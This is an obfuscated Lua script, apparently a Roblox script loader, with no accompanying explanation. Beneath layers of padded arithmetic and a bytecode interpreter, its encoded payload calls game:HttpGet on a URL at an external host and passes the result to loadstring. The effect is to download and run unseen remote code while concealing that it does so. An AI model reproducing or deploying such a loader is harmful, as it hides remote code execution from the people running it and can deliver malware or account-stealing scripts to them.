local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v81=0;local v82;while true do if (v81==0) then v82=v2(v0(v30,16));if v19 then local v98=0;local v99;while true do if (v98==1) then return v99;end if (v98==0) then v99=v5(v82,v19);v19=nil;v98=1;end end else return v82;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v83=0 -0 ;local v84;while true do if (v83==(0 -0)) then v84=(v31/((3 -1)^(v32-(2 -(1 + 0)))))%((621 -(555 + 64))^(((v33-(932 -((1221 -364) + 74))) -(v32-(569 -(367 + 201)))) + (928 -(214 + 713)))) ;return v84-(v84%(1 + 0)) ;end end else local v85=(1 + 1)^(v32-(878 -((1347 -(68 + 997)) + 595))) ;return (((v31%(v85 + v85))>=v85) and 1) or (1637 -(1523 + 114)) ;end end local function v21() local v34=0;local v35;while true do if (v34==1) then return v35;end if (v34==(1270 -(226 + 1044))) then v35=v1(v16,v18,v18);v18=v18 + (4 -(3 + 0)) ;v34=118 -(32 + 85) ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + 1 + 1 );v18=v18 + (959 -(892 + 65)) ;return (v37 * (610 -354)) + v36 ;end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + 3 );v18=v18 + (6 -2) ;return (v41 * 16777216) + (v40 * (120312 -54776)) + (v39 * (606 -(87 + 263))) + v38 ;end local function v24() local v42=v23();local v43=v23();local v44=(10 + 171) -(67 + 40 + 73) ;local v45=(v20(v43,1 + (885 -(261 + 624)) ,35 -15 ) * ((2 + 0)^(78 -(167 -121)))) + v42 ;local v46=v20(v43,16 + 5 ,49 -(10 + (28 -20)) );local v47=((v20(v43,122 -(159 -69) )==(3 -2)) and  -(953 -((1882 -(1020 + 60)) + 150))) or (2 -1) ;if (v46==(0 -0)) then if (v45==(0 -0)) then return v47 * (0 + 0) ;else local v92=997 -(915 + 82) ;while true do if (v92==(438 -(145 + 293))) then v46=2 -1 ;v44=(2345 -(814 + 45)) -(998 + (1202 -714)) ;break;end end end elseif (v46==(1193 + 854)) then return ((v45==(0 -0)) and (v47 * ((1188 -(1069 + (1541 -(630 + 793))))/(772 -(201 + 571))))) or (v47 * NaN) ;end return v8(v47,v46-((7322 -5161) -(116 + 1022)) ) * (v44 + (v45/((4 -2)^(113 -61)))) ;end local function v25(v48) local v49;if  not v48 then v48=v23();if (v48==(0 -0)) then return "";end end v49=v3(v16,v18,(v18 + v48) -1 );v18=v18 + v48 ;local v50={};for v65=1 + 0 , #v49 do v50[v65]=v2(v1(v3(v49,v65,v65)));end return v6(v50);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v51=396 -(115 + 281) ;local v52;local v53;local v54;local v55;local v56;local v57;local v58;while true do if (v51~=(2 -1)) then else local v89=0 + 0 ;while true do if (v89==(2 -1)) then v51=2;break;end if (v89~=(0 -0)) then else v54=nil;v55=nil;v89=1;end end end if (v51~=0) then else local v90=0;while true do if (v90~=(868 -(550 + 317))) then else v51=1 -0 ;break;end if (v90==(0 -0)) then v52=0;v53=nil;v90=2 -1 ;end end end if (v51~=3) then else v58=nil;while true do local v93=285 -(134 + 151) ;while true do if (v93==(1665 -(970 + 695))) then if (v52~=(0 -0)) then else v53={};v54={};v55={};v56={v53,v54,nil,v55};v52=1;end if (1==v52) then v57=v23();v58={};for v122=1 -0 ,v57 do local v123=0;local v124;local v125;local v126;local v127;while true do if (v123==(3 -2)) then v126=nil;v127=nil;v123=1826 -(1195 + 629) ;end if (v123~=(0 -0)) then else v124=0;v125=nil;v123=1;end if ((243 -(187 + 54))~=v123) then else while true do if (v124==(780 -(162 + 618))) then local v164=0 + 0 ;while true do if (1~=v164) then else v124=1;break;end if (0~=v164) then else local v170=0 + 0 ;while true do if (v170==(1 -0)) then v164=1;break;end if (v170~=(0 -0)) then else v125=0 + 0 ;v126=nil;v170=1637 -(1373 + 263) ;end end end end end if (v124==(1001 -(451 + 549))) then v127=nil;while true do if (v125==0) then local v171=0 + 0 ;local v172;while true do if (v171==0) then v172=0;while true do if (0~=v172) then else local v179=0;while true do if (0==v179) then v126=v21();v127=nil;v179=1 -0 ;end if (v179~=(1 -0)) then else v172=1385 -(746 + 638) ;break;end end end if (v172~=(1 + 0)) then else v125=1;break;end end break;end end end if (v125==(1 -0)) then if (v126==1) then v127=v21()~=(341 -(218 + 123)) ;elseif (v126==2) then v127=v24();elseif (v126==3) then v127=v25();end v58[v122]=v127;break;end end break;end end break;end end end v56[1584 -(1535 + 46) ]=v21();v52=2 + 0 ;end v93=1;end if (v93==(1 + 0)) then if (v52~=2) then else local v121=0;while true do if (v121==0) then for v157=1,v23() do local v158=560 -(306 + 254) ;local v159;while true do if ((0 + 0)==v158) then v159=v21();if (v20(v159,1,1)==0) then local v165=0 -0 ;local v166;local v167;local v168;local v169;while true do if (v165==(1469 -(899 + 568))) then while true do if (v166==1) then local v176=0;while true do if (v176==(0 + 0)) then v169={v22(),v22(),nil,nil};if (v167==0) then local v186=290 -(60 + 230) ;local v187;while true do if (v186~=(572 -(426 + 146))) then else v187=0;while true do if ((0 + 0)~=v187) then else v169[1459 -(282 + 1174) ]=v22();v169[815 -(569 + 242) ]=v22();break;end end break;end end elseif (v167==(2 -1)) then v169[1 + 2 ]=v23();elseif (v167==2) then v169[3]=v23() -(2^16) ;elseif (v167~=(1027 -(706 + 318))) then else local v192=1251 -(721 + 530) ;local v193;local v194;while true do if (v192~=0) then else local v195=1271 -(945 + 326) ;while true do if (v195~=1) then else v192=2 -1 ;break;end if (v195~=(0 + 0)) then else v193=700 -(271 + 429) ;v194=nil;v195=1;end end end if (v192~=1) then else while true do if (v193~=(0 + 0)) then else v194=0;while true do if (0==v194) then v169[1503 -(1408 + 92) ]=v23() -(2^(1102 -(461 + 625))) ;v169[1292 -(993 + 295) ]=v22();break;end end break;end end break;end end end v176=1;end if (v176~=1) then else v166=1 + 1 ;break;end end end if (v166~=3) then else if (v20(v168,3,1174 -(418 + 753) )~=1) then else v169[2 + 2 ]=v58[v169[4]];end v53[v157]=v169;break;end if (v166==(1 + 1)) then if (v20(v168,1 + 0 ,1 + 0 )==(530 -(406 + 123))) then v169[1771 -(1749 + 20) ]=v58[v169[1 + 1 ]];end if (v20(v168,1324 -(1249 + 73) ,2)~=(1 + 0)) then else v169[1148 -(466 + 679) ]=v58[v169[3]];end v166=3;end if (0==v166) then local v178=0;while true do if (0~=v178) then else v167=v20(v159,2,3);v168=v20(v159,4,6);v178=2 -1 ;end if (v178~=1) then else v166=2 -1 ;break;end end end end break;end if (v165==(1900 -(106 + 1794))) then local v174=0;while true do if (v174~=(0 + 0)) then else v166=0 + 0 ;v167=nil;v174=1;end if (1~=v174) then else v165=1;break;end end end if (v165~=1) then else local v175=0;while true do if (v175~=(2 -1)) then else v165=5 -3 ;break;end if (v175~=0) then else v168=nil;v169=nil;v175=115 -(4 + 110) ;end end end end end break;end end end for v160=585 -(57 + 527) ,v23() do v54[v160-(1428 -(41 + 1386)) ]=v28();end v121=104 -(17 + 86) ;end if (v121~=(1 + 0)) then else return v56;end end end break;end end end break;end if (v51~=(3 -1)) then else local v91=0 -0 ;while true do if ((166 -(122 + 44))==v91) then v56=nil;v57=nil;v91=1 -0 ;end if (v91==1) then v51=9 -6 ;break;end end end end end local function v29(v59,v60,v61) local v62=v59[1];local v63=v59[2];local v64=v59[3];return function(...) local v67=v62;local v68=v63;local v69=v64;local v70=v27;local v71=1;local v72= -1;local v73={};local v74={...};local v75=v12("#",...) -1 ;local v76={};local v77={};for v86=0,v75 do if (v86>=v69) then v73[v86-v69 ]=v74[v86 + 1 ];else v77[v86]=v74[v86 + 1 ];end end local v78=(v75-v69) + 1 ;local v79;local v80;while true do v79=v67[v71];v80=v79[1];if (v80<=3) then if (v80<=1) then if (v80==0) then do return;end else v77[v79[2]]=v79[3];end elseif (v80==2) then local v102=v79[2];v77[v102]=v77[v102](v13(v77,v102 + 1 ,v72));else local v104=0;local v105;local v106;local v107;local v108;local v109;while true do if (2==v104) then v109=v79[2];v108=v77[v79[3]];v77[v109 + 1 ]=v108;v77[v109]=v108[v79[4]];v71=v71 + 1 ;v104=3;end if (v104==4) then v106,v107=v70(v77[v109](v13(v77,v109 + 1 ,v79[3])));v72=(v107 + v109) -1 ;v105=0;for v152=v109,v72 do v105=v105 + 1 ;v77[v152]=v106[v105];end v71=v71 + 1 ;v104=5;end if (3==v104) then v79=v67[v71];v77[v79[2]]=v79[3];v71=v71 + 1 ;v79=v67[v71];v109=v79[2];v104=4;end if (v104==1) then v71=v71 + 1 ;v79=v67[v71];v77[v79[2]]=v61[v79[3]];v71=v71 + 1 ;v79=v67[v71];v104=2;end if (v104==6) then v77[v79[2]]();v71=v71 + 1 ;v79=v67[v71];do return;end break;end if (v104==0) then v105=nil;v106,v107=nil;v108=nil;v109=nil;v77[v79[2]]=v61[v79[3]];v104=1;end if (v104==5) then v79=v67[v71];v109=v79[2];v77[v109]=v77[v109](v13(v77,v109 + 1 ,v72));v71=v71 + 1 ;v79=v67[v71];v104=6;end end end elseif (v80<=5) then if (v80==4) then local v110=0;local v111;local v112;local v113;local v114;while true do if (v110==2) then for v155=v111,v72 do local v156=0;while true do if (v156==0) then v114=v114 + 1 ;v77[v155]=v112[v114];break;end end end break;end if (v110==1) then v72=(v113 + v111) -1 ;v114=0;v110=2;end if (v110==0) then v111=v79[2];v112,v113=v70(v77[v111](v13(v77,v111 + 1 ,v79[3])));v110=1;end end else v77[v79[2]]=v61[v79[3]];end elseif (v80>6) then local v117=0;local v118;local v119;while true do if (v117==1) then v77[v118 + 1 ]=v119;v77[v118]=v119[v79[4]];break;end if (v117==0) then v118=v79[2];v119=v77[v79[3]];v117=1;end end else v77[v79[2]]();end v71=v71 + 1 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403343O00682O7470733A2O2F65676F72696B7573612E73706163652F3361306131322O35646165316265666138333536653431392E6C756100083O0012033O00013O00122O000100023O00202O00010001000300122O000300046O000100039O0000026O000100016O00017O00",v9(),...);